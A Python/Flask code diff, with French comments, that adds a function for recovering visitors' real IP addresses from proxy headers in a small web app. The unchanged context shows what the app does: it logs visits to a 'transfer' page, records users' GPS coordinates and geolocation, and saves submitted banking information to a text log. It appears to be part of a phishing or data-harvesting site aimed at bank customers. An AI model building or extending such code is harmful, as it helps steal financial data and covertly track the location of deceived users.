@@ -12,6 +12,16 @@ app = Flask(__name__)
 os.makedirs(LOGS_DIR, exist_ok=True)
 log_file = os.path.join(LOGS_DIR, 'user_data.txt')
 
+def get_client_ip():
+    """Récupérer l'adresse IP réelle du client, même derrière un proxy"""
+    if request.headers.get('X-Forwarded-For'):
+        client_ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
+    elif request.headers.get('X-Real-IP'):
+        client_ip = request.headers.get('X-Real-IP')
+    else:
+        client_ip = request.remote_addr
+    return client_ip
+
 def log_user_data(ip, coords=None, geoloc=None, action=None):
     """Enregistrer les données de l'utilisateur dans le fichier log"""
     now = datetime.datetime.now()
@@ -34,7 +44,7 @@ def log_user_data(ip, coords=None, geoloc=None, action=None):
 def index():
     """Page d'accueil"""
     # Enregistrer l'accès à la page d'accueil
-    ip = request.remote_addr
+    ip = get_client_ip()
     log_user_data(ip)
     return render_template('index.html')
 
@@ -42,7 +52,7 @@ def index():
 def transfer():
     """Page de transfert"""
     # Enregistrer l'accès à la page de transfert
-    ip = request.remote_addr
+    ip = get_client_ip()
     log_user_data(ip, action="accès page transfert")
     return render_template('transfer.html')
 
@@ -50,7 +60,7 @@ def transfer():
 def log_location():
     """Endpoint pour enregistrer la localisation de l'utilisateur"""
     data = request.json
-    ip = request.remote_addr
+    ip = get_client_ip()
     
     # Extraire les coordonnées et les informations de géolocalisation
     coords = data.get('coords')
@@ -66,7 +76,7 @@ def log_location():
 def submit_form():
     """Endpoint pour traiter les données du formulaire"""
     data = request.json
-    ip = request.remote_addr
+    ip = get_client_ip()
     
     # Enregistrer les informations bancaires
     log_entry = {
